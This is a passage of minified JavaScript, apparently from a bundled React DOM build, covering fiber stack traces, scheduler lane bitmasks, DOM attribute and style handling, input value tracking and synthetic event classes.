            r < c.length && !c[r].includes(`DetermineComponentFrameRoot`);
          )
            r++;
          for (
            ;
            i < l.length && !l[i].includes(`DetermineComponentFrameRoot`);
          )
            i++;
          if (r === c.length || i === l.length)
            for (
              r = c.length - 1, i = l.length - 1;
              1 <= r && 0 <= i && c[r] !== l[i];
            )
              i--;
          for (; 1 <= r && 0 <= i; r--, i--)
            if (c[r] !== l[i]) {
              if (r !== 1 || i !== 1)
                do
                  if ((r--, i--, 0 > i || c[r] !== l[i])) {
                    var u =
                      `
` + c[r].replace(` at new `, ` at `);
                    return (
                      e.displayName &&
                        u.includes(`<anonymous>`) &&
                        (u = u.replace(`<anonymous>`, e.displayName)),
                      u
                    );
                  }
                while (1 <= r && 0 <= i);
              break;
            }
        }
      } finally {
        ((xe = !1), (Error.prepareStackTrace = n));
      }
      return (n = e ? e.displayName || e.name : ``) ? be(n) : ``;
    }
    function Ce(e, t) {
      switch (e.tag) {
        case 26:
        case 27:
        case 5:
          return be(e.type);
        case 16:
          return be(`Lazy`);
        case 13:
          return e.child !== t && t !== null
            ? be(`Suspense Fallback`)
            : be(`Suspense`);
        case 19:
          return be(`SuspenseList`);
        case 0:
        case 15:
          return Se(e.type, !1);
        case 11:
          return Se(e.type.render, !1);
        case 1:
          return Se(e.type, !0);
        case 31:
          return be(`Activity`);
        default:
          return ``;
      }
    }
    function we(e) {
      try {
        var t = ``,
          n = null;
        do ((t += Ce(e, n)), (n = e), (e = e.return));
        while (e);
        return t;
      } catch (e) {
        return (
          `
Error generating stack: ` +
          e.message +
          `
` +
          e.stack
        );
      }
    }
    var Te = Object.prototype.hasOwnProperty,
      Ee = t.unstable_scheduleCallback,
      De = t.unstable_cancelCallback,
      Oe = t.unstable_shouldYield,
      ke = t.unstable_requestPaint,
      Ae = t.unstable_now,
      je = t.unstable_getCurrentPriorityLevel,
      Me = t.unstable_ImmediatePriority,
      Ne = t.unstable_UserBlockingPriority,
      Pe = t.unstable_NormalPriority,
      Fe = t.unstable_LowPriority,
      Ie = t.unstable_IdlePriority,
      Le = t.log,
      Re = t.unstable_setDisableYieldValue,
      ze = null,
      Be = null;
    function Ve(e) {
      if (
        (typeof Le == `function` && Re(e),
        Be && typeof Be.setStrictMode == `function`)
      )
        try {
          Be.setStrictMode(ze, e);
        } catch {}
    }
    var He = Math.clz32 ? Math.clz32 : Ge,
      Ue = Math.log,
      We = Math.LN2;
    function Ge(e) {
      return ((e >>>= 0), e === 0 ? 32 : (31 - ((Ue(e) / We) | 0)) | 0);
    }
    var Ke = 256,
      qe = 262144,
      Je = 4194304;
    function Ye(e) {
      var t = e & 42;
      if (t !== 0) return t;
      switch (e & -e) {
        case 1:
          return 1;
        case 2:
          return 2;
        case 4:
          return 4;
        case 8:
          return 8;
        case 16:
          return 16;
        case 32:
          return 32;
        case 64:
          return 64;
        case 128:
          return 128;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
          return e & 261888;
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
          return e & 3932160;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
          return e & 62914560;
        case 67108864:
          return 67108864;
        case 134217728:
          return 134217728;
        case 268435456:
          return 268435456;
        case 536870912:
          return 536870912;
        case 1073741824:
          return 0;
        default:
          return e;
      }
    }
    function Xe(e, t, n) {
      var r = e.pendingLanes;
      if (r === 0) return 0;
      var i = 0,
        a = e.suspendedLanes,
        o = e.pingedLanes;
      e = e.warmLanes;
      var s = r & 134217727;
      return (
        s === 0
          ? ((s = r & ~a),
            s === 0
              ? o === 0
                ? n || ((n = r & ~e), n !== 0 && (i = Ye(n)))
                : (i = Ye(o))
              : (i = Ye(s)))
          : ((r = s & ~a),
            r === 0
              ? ((o &= s),
                o === 0
                  ? n || ((n = s & ~e), n !== 0 && (i = Ye(n)))
                  : (i = Ye(o)))
              : (i = Ye(r))),
        i === 0
          ? 0
          : t !== 0 &&
              t !== i &&
              (t & a) === 0 &&
              ((a = i & -i), (n = t & -t), a >= n || (a === 32 && n & 4194048))
            ? t
            : i
      );
    }
    function Ze(e, t) {
      return (e.pendingLanes & ~(e.suspendedLanes & ~e.pingedLanes) & t) === 0;
    }
    function Qe(e, t) {
      switch (e) {
        case 1:
        case 2:
        case 4:
        case 8:
        case 64:
          return t + 250;
        case 16:
        case 32:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
          return t + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
          return -1;
        case 67108864:
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
          return -1;
        default:
          return -1;
      }
    }
    function $e() {
      var e = Je;
      return ((Je <<= 1), !(Je & 62914560) && (Je = 4194304), e);
    }
    function et(e) {
      for (var t = [], n = 0; 31 > n; n++) t.push(e);
      return t;
    }
    function tt(e, t) {
      ((e.pendingLanes |= t),
        t !== 268435456 &&
          ((e.suspendedLanes = 0), (e.pingedLanes = 0), (e.warmLanes = 0)));
    }
    function nt(e, t, n, r, i, a) {
      var o = e.pendingLanes;
      ((e.pendingLanes = n),
        (e.suspendedLanes = 0),
        (e.pingedLanes = 0),
        (e.warmLanes = 0),
        (e.expiredLanes &= n),
        (e.entangledLanes &= n),
        (e.errorRecoveryDisabledLanes &= n),
        (e.shellSuspendCounter = 0));
      var s = e.entanglements,
        c = e.expirationTimes,
        l = e.hiddenUpdates;
      for (n = o & ~n; 0 < n; ) {
        var u = 31 - He(n),
          d = 1 << u;
        ((s[u] = 0), (c[u] = -1));
        var f = l[u];
        if (f !== null)
          for (l[u] = null, u = 0; u < f.length; u++) {
            var p = f[u];
            p !== null && (p.lane &= -536870913);
          }
        n &= ~d;
      }
      (r !== 0 && rt(e, r, 0),
        a !== 0 &&
          i === 0 &&
          e.tag !== 0 &&
          (e.suspendedLanes |= a & ~(o & ~t)));
    }
    function rt(e, t, n) {
      ((e.pendingLanes |= t), (e.suspendedLanes &= ~t));
      var r = 31 - He(t);
      ((e.entangledLanes |= t),
        (e.entanglements[r] = e.entanglements[r] | 1073741824 | (n & 261930)));
    }
    function it(e, t) {
      var n = (e.entangledLanes |= t);
      for (e = e.entanglements; n; ) {
        var r = 31 - He(n),
          i = 1 << r;
        ((i & t) | (e[r] & t) && (e[r] |= t), (n &= ~i));
      }
    }
    function at(e, t) {
      var n = t & -t;
      return (
        (n = n & 42 ? 1 : ot(n)),
        (n & (e.suspendedLanes | t)) === 0 ? n : 0
      );
    }
    function ot(e) {
      switch (e) {
        case 2:
          e = 1;
          break;
        case 8:
          e = 4;
          break;
        case 32:
          e = 16;
          break;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
          e = 128;
          break;
        case 268435456:
          e = 134217728;
          break;
        default:
          e = 0;
      }
      return e;
    }
    function st(e) {
      return (
        (e &= -e),
        2 < e ? (8 < e ? (e & 134217727 ? 32 : 268435456) : 8) : 2
      );
    }
    function ct() {
      var e = j.p;
      return e === 0 ? ((e = window.event), e === void 0 ? 32 : mp(e.type)) : e;
    }
    function lt(e, t) {
      var n = j.p;
      try {
        return ((j.p = e), t());
      } finally {
        j.p = n;
      }
    }
    var ut = Math.random().toString(36).slice(2),
      dt = `__reactFiber$` + ut,
      ft = `__reactProps$` + ut,
      pt = `__reactContainer$` + ut,
      mt = `__reactEvents$` + ut,
      ht = `__reactListeners$` + ut,
      gt = `__reactHandles$` + ut,
      _t = `__reactResources$` + ut,
      vt = `__reactMarker$` + ut;
    function yt(e) {
      (delete e[dt], delete e[ft], delete e[mt], delete e[ht], delete e[gt]);
    }
    function bt(e) {
      var t = e[dt];
      if (t) return t;
      for (var n = e.parentNode; n; ) {
        if ((t = n[pt] || n[dt])) {
          if (
            ((n = t.alternate),
            t.child !== null || (n !== null && n.child !== null))
          )
            for (e = df(e); e !== null; ) {
              if ((n = e[dt])) return n;
              e = df(e);
            }
          return t;
        }
        ((e = n), (n = e.parentNode));
      }
      return null;
    }
    function xt(e) {
      if ((e = e[dt] || e[pt])) {
        var t = e.tag;
        if (
          t === 5 ||
          t === 6 ||
          t === 13 ||
          t === 31 ||
          t === 26 ||
          t === 27 ||
          t === 3
        )
          return e;
      }
      return null;
    }
    function St(e) {
      var t = e.tag;
      if (t === 5 || t === 26 || t === 27 || t === 6) return e.stateNode;
      throw Error(i(33));
    }
    function Ct(e) {
      var t = e[_t];
      return (
        (t ||= e[_t] =
          { hoistableStyles: new Map(), hoistableScripts: new Map() }),
        t
      );
    }
    function wt(e) {
      e[vt] = !0;
    }
    var Tt = new Set(),
      Et = {};
    function Dt(e, t) {
      (Ot(e, t), Ot(e + `Capture`, t));
    }
    function Ot(e, t) {
      for (Et[e] = t, e = 0; e < t.length; e++) Tt.add(t[e]);
    }
    var kt = RegExp(
        `^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$`,
      ),
      At = {},
      jt = {};
    function Mt(e) {
      return Te.call(jt, e)
        ? !0
        : Te.call(At, e)
          ? !1
          : kt.test(e)
            ? (jt[e] = !0)
            : ((At[e] = !0), !1);
    }
    function Nt(e, t, n) {
      if (Mt(t))
        if (n === null) e.removeAttribute(t);
        else {
          switch (typeof n) {
            case `undefined`:
            case `function`:
            case `symbol`:
              e.removeAttribute(t);
              return;
            case `boolean`:
              var r = t.toLowerCase().slice(0, 5);
              if (r !== `data-` && r !== `aria-`) {
                e.removeAttribute(t);
                return;
              }
          }
          e.setAttribute(t, `` + n);
        }
    }
    function Pt(e, t, n) {
      if (n === null) e.removeAttribute(t);
      else {
        switch (typeof n) {
          case `undefined`:
          case `function`:
          case `symbol`:
          case `boolean`:
            e.removeAttribute(t);
            return;
        }
        e.setAttribute(t, `` + n);
      }
    }
    function Ft(e, t, n, r) {
      if (r === null) e.removeAttribute(n);
      else {
        switch (typeof r) {
          case `undefined`:
          case `function`:
          case `symbol`:
          case `boolean`:
            e.removeAttribute(n);
            return;
        }
        e.setAttributeNS(t, n, `` + r);
      }
    }
    function It(e) {
      switch (typeof e) {
        case `bigint`:
        case `boolean`:
        case `number`:
        case `string`:
        case `undefined`:
          return e;
        case `object`:
          return e;
        default:
          return ``;
      }
    }
    function Lt(e) {
      var t = e.type;
      return (
        (e = e.nodeName) &&
        e.toLowerCase() === `input` &&
        (t === `checkbox` || t === `radio`)
      );
    }
    function Rt(e, t, n) {
      var r = Object.getOwnPropertyDescriptor(e.constructor.prototype, t);
      if (
        !e.hasOwnProperty(t) &&
        r !== void 0 &&
        typeof r.get == `function` &&
        typeof r.set == `function`
      ) {
        var i = r.get,
          a = r.set;
        return (
          Object.defineProperty(e, t, {
            configurable: !0,
            get: function () {
              return i.call(this);
            },
            set: function (e) {
              ((n = `` + e), a.call(this, e));
            },
          }),
          Object.defineProperty(e, t, { enumerable: r.enumerable }),
          {
            getValue: function () {
              return n;
            },
            setValue: function (e) {
              n = `` + e;
            },
            stopTracking: function () {
              ((e._valueTracker = null), delete e[t]);
            },
          }
        );
      }
    }
    function zt(e) {
      if (!e._valueTracker) {
        var t = Lt(e) ? `checked` : `value`;
        e._valueTracker = Rt(e, t, `` + e[t]);
      }
    }
    function Bt(e) {
      if (!e) return !1;
      var t = e._valueTracker;
      if (!t) return !0;
      var n = t.getValue(),
        r = ``;
      return (
        e && (r = Lt(e) ? (e.checked ? `true` : `false`) : e.value),
        (e = r),
        e === n ? !1 : (t.setValue(e), !0)
      );
    }
    function Vt(e) {
      if (((e ||= typeof document < `u` ? document : void 0), e === void 0))
        return null;
      try {
        return e.activeElement || e.body;
      } catch {
        return e.body;
      }
    }
    var Ht = /[\n"\\]/g;
    function Ut(e) {
      return e.replace(Ht, function (e) {
        return `\\` + e.charCodeAt(0).toString(16) + ` `;
      });
    }
    function Wt(e, t, n, r, i, a, o, s) {
      ((e.name = ``),
        o != null &&
        typeof o != `function` &&
        typeof o != `symbol` &&
        typeof o != `boolean`
          ? (e.type = o)
          : e.removeAttribute(`type`),
        t == null
          ? (o !== `submit` && o !== `reset`) || e.removeAttribute(`value`)
          : o === `number`
            ? ((t === 0 && e.value === ``) || e.value != t) &&
              (e.value = `` + It(t))
            : e.value !== `` + It(t) && (e.value = `` + It(t)),
        t == null
          ? n == null
            ? r != null && e.removeAttribute(`value`)
            : Kt(e, o, It(n))
          : Kt(e, o, It(t)),
        i == null && a != null && (e.defaultChecked = !!a),
        i != null &&
          (e.checked = i && typeof i != `function` && typeof i != `symbol`),
        s != null &&
        typeof s != `function` &&
        typeof s != `symbol` &&
        typeof s != `boolean`
          ? (e.name = `` + It(s))
          : e.removeAttribute(`name`));
    }
    function Gt(e, t, n, r, i, a, o, s) {
      if (
        (a != null &&
          typeof a != `function` &&
          typeof a != `symbol` &&
          typeof a != `boolean` &&
          (e.type = a),
        t != null || n != null)
      ) {
        if (!((a !== `submit` && a !== `reset`) || t != null)) {
          zt(e);
          return;
        }
        ((n = n == null ? `` : `` + It(n)),
          (t = t == null ? n : `` + It(t)),
          s || t === e.value || (e.value = t),
          (e.defaultValue = t));
      }
      ((r ??= i),
        (r = typeof r != `function` && typeof r != `symbol` && !!r),
        (e.checked = s ? e.checked : !!r),
        (e.defaultChecked = !!r),
        o != null &&
          typeof o != `function` &&
          typeof o != `symbol` &&
          typeof o != `boolean` &&
          (e.name = o),
        zt(e));
    }
    function Kt(e, t, n) {
      (t === `number` && Vt(e.ownerDocument) === e) ||
        e.defaultValue === `` + n ||
        (e.defaultValue = `` + n);
    }
    function qt(e, t, n, r) {
      if (((e = e.options), t)) {
        t = {};
        for (var i = 0; i < n.length; i++) t[`$` + n[i]] = !0;
        for (n = 0; n < e.length; n++)
          ((i = t.hasOwnProperty(`$` + e[n].value)),
            e[n].selected !== i && (e[n].selected = i),
            i && r && (e[n].defaultSelected = !0));
      } else {
        for (n = `` + It(n), t = null, i = 0; i < e.length; i++) {
          if (e[i].value === n) {
            ((e[i].selected = !0), r && (e[i].defaultSelected = !0));
            return;
          }
          t !== null || e[i].disabled || (t = e[i]);
        }
        t !== null && (t.selected = !0);
      }
    }
    function Jt(e, t, n) {
      if (
        t != null &&
        ((t = `` + It(t)), t !== e.value && (e.value = t), n == null)
      ) {
        e.defaultValue !== t && (e.defaultValue = t);
        return;
      }
      e.defaultValue = n == null ? `` : `` + It(n);
    }
    function Yt(e, t, n, r) {
      if (t == null) {
        if (r != null) {
          if (n != null) throw Error(i(92));
          if (ae(r)) {
            if (1 < r.length) throw Error(i(93));
            r = r[0];
          }
          n = r;
        }
        ((n ??= ``), (t = n));
      }
      ((n = It(t)),
        (e.defaultValue = n),
        (r = e.textContent),
        r === n && r !== `` && r !== null && (e.value = r),
        zt(e));
    }
    function Xt(e, t) {
      if (t) {
        var n = e.firstChild;
        if (n && n === e.lastChild && n.nodeType === 3) {
          n.nodeValue = t;
          return;
        }
      }
      e.textContent = t;
    }
    var Zt = new Set(
      `animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp`.split(
        ` `,
      ),
    );
    function Qt(e, t, n) {
      var r = t.indexOf(`--`) === 0;
      n == null || typeof n == `boolean` || n === ``
        ? r
          ? e.setProperty(t, ``)
          : t === `float`
            ? (e.cssFloat = ``)
            : (e[t] = ``)
        : r
          ? e.setProperty(t, n)
          : typeof n != `number` || n === 0 || Zt.has(t)
            ? t === `float`
              ? (e.cssFloat = n)
              : (e[t] = (`` + n).trim())
            : (e[t] = n + `px`);
    }
    function $t(e, t, n) {
      if (t != null && typeof t != `object`) throw Error(i(62));
      if (((e = e.style), n != null)) {
        for (var r in n)
          !n.hasOwnProperty(r) ||
            (t != null && t.hasOwnProperty(r)) ||
            (r.indexOf(`--`) === 0
              ? e.setProperty(r, ``)
              : r === `float`
                ? (e.cssFloat = ``)
                : (e[r] = ``));
        for (var a in t)
          ((r = t[a]), t.hasOwnProperty(a) && n[a] !== r && Qt(e, a, r));
      } else for (var o in t) t.hasOwnProperty(o) && Qt(e, o, t[o]);
    }
    function en(e) {
      if (e.indexOf(`-`) === -1) return !1;
      switch (e) {
        case `annotation-xml`:
        case `color-profile`:
        case `font-face`:
        case `font-face-src`:
        case `font-face-uri`:
        case `font-face-format`:
        case `font-face-name`:
        case `missing-glyph`:
          return !1;
        default:
          return !0;
      }
    }
    var tn = new Map([
        [`acceptCharset`, `accept-charset`],
        [`htmlFor`, `for`],
        [`httpEquiv`, `http-equiv`],
        [`crossOrigin`, `crossorigin`],
        [`accentHeight`, `accent-height`],
        [`alignmentBaseline`, `alignment-baseline`],
        [`arabicForm`, `arabic-form`],
        [`baselineShift`, `baseline-shift`],
        [`capHeight`, `cap-height`],
        [`clipPath`, `clip-path`],
        [`clipRule`, `clip-rule`],
        [`colorInterpolation`, `color-interpolation`],
        [`colorInterpolationFilters`, `color-interpolation-filters`],
        [`colorProfile`, `color-profile`],
        [`colorRendering`, `color-rendering`],
        [`dominantBaseline`, `dominant-baseline`],
        [`enableBackground`, `enable-background`],
        [`fillOpacity`, `fill-opacity`],
        [`fillRule`, `fill-rule`],
        [`floodColor`, `flood-color`],
        [`floodOpacity`, `flood-opacity`],
        [`fontFamily`, `font-family`],
        [`fontSize`, `font-size`],
        [`fontSizeAdjust`, `font-size-adjust`],
        [`fontStretch`, `font-stretch`],
        [`fontStyle`, `font-style`],
        [`fontVariant`, `font-variant`],
        [`fontWeight`, `font-weight`],
        [`glyphName`, `glyph-name`],
        [`glyphOrientationHorizontal`, `glyph-orientation-horizontal`],
        [`glyphOrientationVertical`, `glyph-orientation-vertical`],
        [`horizAdvX`, `horiz-adv-x`],
        [`horizOriginX`, `horiz-origin-x`],
        [`imageRendering`, `image-rendering`],
        [`letterSpacing`, `letter-spacing`],
        [`lightingColor`, `lighting-color`],
        [`markerEnd`, `marker-end`],
        [`markerMid`, `marker-mid`],
        [`markerStart`, `marker-start`],
        [`overlinePosition`, `overline-position`],
        [`overlineThickness`, `overline-thickness`],
        [`paintOrder`, `paint-order`],
        [`panose-1`, `panose-1`],
        [`pointerEvents`, `pointer-events`],
        [`renderingIntent`, `rendering-intent`],
        [`shapeRendering`, `shape-rendering`],
        [`stopColor`, `stop-color`],
        [`stopOpacity`, `stop-opacity`],
        [`strikethroughPosition`, `strikethrough-position`],
        [`strikethroughThickness`, `strikethrough-thickness`],
        [`strokeDasharray`, `stroke-dasharray`],
        [`strokeDashoffset`, `stroke-dashoffset`],
        [`strokeLinecap`, `stroke-linecap`],
        [`strokeLinejoin`, `stroke-linejoin`],
        [`strokeMiterlimit`, `stroke-miterlimit`],
        [`strokeOpacity`, `stroke-opacity`],
        [`strokeWidth`, `stroke-width`],
        [`textAnchor`, `text-anchor`],
        [`textDecoration`, `text-decoration`],
        [`textRendering`, `text-rendering`],
        [`transformOrigin`, `transform-origin`],
        [`underlinePosition`, `underline-position`],
        [`underlineThickness`, `underline-thickness`],
        [`unicodeBidi`, `unicode-bidi`],
        [`unicodeRange`, `unicode-range`],
        [`unitsPerEm`, `units-per-em`],
        [`vAlphabetic`, `v-alphabetic`],
        [`vHanging`, `v-hanging`],
        [`vIdeographic`, `v-ideographic`],
        [`vMathematical`, `v-mathematical`],
        [`vectorEffect`, `vector-effect`],
        [`vertAdvY`, `vert-adv-y`],
        [`vertOriginX`, `vert-origin-x`],
        [`vertOriginY`, `vert-origin-y`],
        [`wordSpacing`, `word-spacing`],
        [`writingMode`, `writing-mode`],
        [`xmlnsXlink`, `xmlns:xlink`],
        [`xHeight`, `x-height`],
      ]),
      nn =
        /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
    function rn(e) {
      return nn.test(`` + e)
        ? `javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')`
        : e;
    }
    function an() {}
    var on = null;
    function sn(e) {
      return (
        (e = e.target || e.srcElement || window),
        e.correspondingUseElement && (e = e.correspondingUseElement),
        e.nodeType === 3 ? e.parentNode : e
      );
    }
    var cn = null,
      ln = null;
    function un(e) {
      var t = xt(e);
      if (t && (e = t.stateNode)) {
        var n = e[ft] || null;
        a: switch (((e = t.stateNode), t.type)) {
          case `input`:
            if (
              (Wt(
                e,
                n.value,
                n.defaultValue,
                n.defaultValue,
                n.checked,
                n.defaultChecked,
                n.type,
                n.name,
              ),
              (t = n.name),
              n.type === `radio` && t != null)
            ) {
              for (n = e; n.parentNode; ) n = n.parentNode;
              for (
                n = n.querySelectorAll(
                  `input[name="` + Ut(`` + t) + `"][type="radio"]`,
                ),
                  t = 0;
                t < n.length;
                t++
              ) {
                var r = n[t];
                if (r !== e && r.form === e.form) {
                  var a = r[ft] || null;
                  if (!a) throw Error(i(90));
                  Wt(
                    r,
                    a.value,
                    a.defaultValue,
                    a.defaultValue,
                    a.checked,
                    a.defaultChecked,
                    a.type,
                    a.name,
                  );
                }
              }
              for (t = 0; t < n.length; t++)
                ((r = n[t]), r.form === e.form && Bt(r));
            }
            break a;
          case `textarea`:
            Jt(e, n.value, n.defaultValue);
            break a;
          case `select`:
            ((t = n.value), t != null && qt(e, !!n.multiple, t, !1));
        }
      }
    }
    var dn = !1;
    function fn(e, t, n) {
      if (dn) return e(t, n);
      dn = !0;
      try {
        return e(t);
      } finally {
        if (
          ((dn = !1),
          (cn !== null || ln !== null) &&
            (bu(), cn && ((t = cn), (e = ln), (ln = cn = null), un(t), e)))
        )
          for (t = 0; t < e.length; t++) un(e[t]);
      }
    }
    function pn(e, t) {
      var n = e.stateNode;
      if (n === null) return null;
      var r = n[ft] || null;
      if (r === null) return null;
      n = r[t];
      a: switch (t) {
        case `onClick`:
        case `onClickCapture`:
        case `onDoubleClick`:
        case `onDoubleClickCapture`:
        case `onMouseDown`:
        case `onMouseDownCapture`:
        case `onMouseMove`:
        case `onMouseMoveCapture`:
        case `onMouseUp`:
        case `onMouseUpCapture`:
        case `onMouseEnter`:
          ((r = !r.disabled) ||
            ((e = e.type),
            (r = !(
              e === `button` ||
              e === `input` ||
              e === `select` ||
              e === `textarea`
            ))),
            (e = !r));
          break a;
        default:
          e = !1;
      }
      if (e) return null;
      if (n && typeof n != `function`) throw Error(i(231, t, typeof n));
      return n;
    }
    var mn = !(
        typeof window > `u` ||
        window.document === void 0 ||
        window.document.createElement === void 0
      ),
      hn = !1;
    if (mn)
      try {
        var gn = {};
        (Object.defineProperty(gn, `passive`, {
          get: function () {
            hn = !0;
          },
        }),
          window.addEventListener(`test`, gn, gn),
          window.removeEventListener(`test`, gn, gn));
      } catch {
        hn = !1;
      }
    var _n = null,
      vn = null,
      yn = null;
    function bn() {
      if (yn) return yn;
      var e,
        t = vn,
        n = t.length,
        r,
        i = `value` in _n ? _n.value : _n.textContent,
        a = i.length;
      for (e = 0; e < n && t[e] === i[e]; e++);
      var o = n - e;
      for (r = 1; r <= o && t[n - r] === i[a - r]; r++);
      return (yn = i.slice(e, 1 < r ? 1 - r : void 0));
    }
    function xn(e) {
      var t = e.keyCode;
      return (
        `charCode` in e
          ? ((e = e.charCode), e === 0 && t === 13 && (e = 13))
          : (e = t),
        e === 10 && (e = 13),
        32 <= e || e === 13 ? e : 0
      );
    }
    function Sn() {
      return !0;
    }
    function Cn() {
      return !1;
    }
    function wn(e) {
      function t(t, n, r, i, a) {
        for (var o in ((this._reactName = t),
        (this._targetInst = r),
        (this.type = n),
        (this.nativeEvent = i),
        (this.target = a),
        (this.currentTarget = null),
        e))
          e.hasOwnProperty(o) && ((t = e[o]), (this[o] = t ? t(i) : i[o]));
        return (
          (this.isDefaultPrevented = (
            i.defaultPrevented == null
              ? !1 === i.returnValue
              : i.defaultPrevented
          )
            ? Sn
            : Cn),
          (this.isPropagationStopped = Cn),
          this
        );
      }
      return (
        h(t.prototype, {
          preventDefault: function () {
            this.defaultPrevented = !0;
            var e = this.nativeEvent;
            e &&
              (e.preventDefault
                ? e.preventDefault()
                : typeof e.returnValue != `unknown` && (e.returnValue = !1),
              (this.isDefaultPrevented = Sn));
          },
          stopPropagation: function () {
            var e = this.nativeEvent;
            e &&
              (e.stopPropagation
                ? e.stopPropagation()
                : typeof e.cancelBubble != `unknown` && (e.cancelBubble = !0),
              (this.isPropagationStopped = Sn));
          },
          persist: function () {},
          isPersistent: Sn,
        }),
        t
      );
    }
    var Tn = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function (e) {
          return e.timeStamp || Date.now();
        },
        defaultPrevented: 0,
        isTrusted: 0,
      },
      En = wn(Tn),
      Dn = h({}, Tn, { view: 0, detail: 0 }),
      On = wn(Dn),
      kn,
      An,
      jn,
      Mn = h({}, Dn, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: Un,
        button: 0,
        buttons: 0,
        relatedTarget: function (e) {
          return e.relatedTarget === void 0
            ? e.fromElement === e.srcElement
              ? e.toElement
              : e.fromElement
            : e.relatedTarget;
        },
        movementX: function (e) {
          return `movementX` in e
            ? e.movementX
            : (e !== jn &&
                (jn && e.type === `mousemove`
                  ? ((kn = e.screenX - jn.screenX),
                    (An = e.screenY - jn.screenY))
                  : (An = kn = 0),
                (jn = e)),
              kn);
        },
        movementY: function (e) {
          return `movementY` in e ? e.movementY : An;
        },
      }),
      Nn = wn(Mn),
      Pn = wn(h({}, Mn, { dataTransfer: 0 })),
      Fn = wn(h({}, Dn, { relatedTarget: 0 })),
      In = wn(
        h({}, Tn, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
      ),
      Ln = wn(
        h({}, Tn, {
          clipboardData: function (e) {
            return `clipboardData` in e
              ? e.clipboardData
              : window.clipboardData;
          },
        }),
      ),
      Rn = wn(h({}, Tn, { data: 0 })),
      zn = {
        Esc: `Escape`,
        Spacebar: ` `,
        Left: `ArrowLeft`,
        Up: `ArrowUp`,
        Right: `ArrowRight`,
        Down: `ArrowDown`,
        Del: `Delete`,
        Win: `OS`,
        Menu: `ContextMenu`,
        Apps: `ContextMenu`,
        Scroll: `ScrollLock`,
        MozPrintableKey: `Unidentified`,
      },
      Bn = {
        8: `Backspace`,
        9: `Tab`,
        12: `Clear`,
        13: `Enter`,
        16: `Shift`,
        17: `Control`,
        18: `Alt`,
        19: `Pause`,
        20: `CapsLock`,
        27: `Escape`,
        32: ` `,
        33: `PageUp`,
        34: `PageDown`,
        35: `End`,
        36: `Home`,
        37: `ArrowLeft`,
        38: `ArrowUp`,
        39: `ArrowRight`,
        40: `ArrowDown`,
        45: `Insert`,
        46: `Delete`,
        112: `F1`,
        113: `F2`,
        114: `F3`,
        115: `F4`,
        116: `F5`,
        117: `F6`,
        118: `F7`,
        119: `F8`,
        120: `F9`,
        121: `F10`,
        122: `F11`,
        123: `F12`,
        144: `NumLock`,
        145: `ScrollLock`,
        224: `Meta`,
      },
      Vn = {
        Alt: `altKey`,
        Control: `ctrlKey`,
        Meta: `metaKey`,
        Shift: `shiftKey`,
      };
    function Hn(e) {
      var t = this.nativeEvent;
      return t.getModifierState
        ? t.getModifierState(e)
        : (e = Vn[e])
          ? !!t[e]
          : !1;
    }
    function Un() {
      return Hn;
    }
    var Wn = wn(
        h({}, Dn, {
          key: function (e) {
            if (e.key) {
              var t = zn[e.key] || e.key;
              if (t !== `Unidentified`) return t;
            }
            return e.type === `keypress`
              ? ((e = xn(e)), e === 13 ? `Enter` : String.fromCharCode(e))
              : e.type === `keydown` || e.type === `keyup`
                ? Bn[e.keyCode] || `Unidentified`
                : ``;
          },
          code: 0,
          location: 0,
          ctrlKey: 0,
          shiftKey: 0,
          altKey: 0,
          metaKey: 0,
          repeat: 0,
          locale: 0,
          getModifierState: Un,
          charCode: function (e) {
            return e.type === `keypress` ? xn(e) : 0;
          },
          keyCode: function (e) {
            return e.type === `keydown` || e.type === `keyup` ? e.keyCode : 0;
          },
